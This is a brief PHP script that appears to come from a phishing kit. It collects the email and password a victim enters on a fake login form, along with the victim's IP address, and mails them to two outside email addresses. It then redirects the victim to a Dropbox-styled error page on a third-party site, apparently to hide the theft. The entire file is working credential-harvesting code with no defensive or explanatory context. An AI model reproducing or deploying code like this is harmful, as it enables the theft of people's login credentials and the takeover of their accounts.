<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------- Login Details --------------------------------\n";
$message .= "Email      : ".$_POST['login_email']."\n";
$message .= "Password     : ".$_POST['login_password']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "---------Created H0ye--------------\n";
$recipient = "lisiijia17@gmail.com, omramy_azad@yahoo.com";
$subject = "Hoye";
mail($recipient,$subject,$message,$headers);
	 
	   
		   header("Location: https://www.kanaktrades.com/d/dropbox/error/dropbox/");


?>
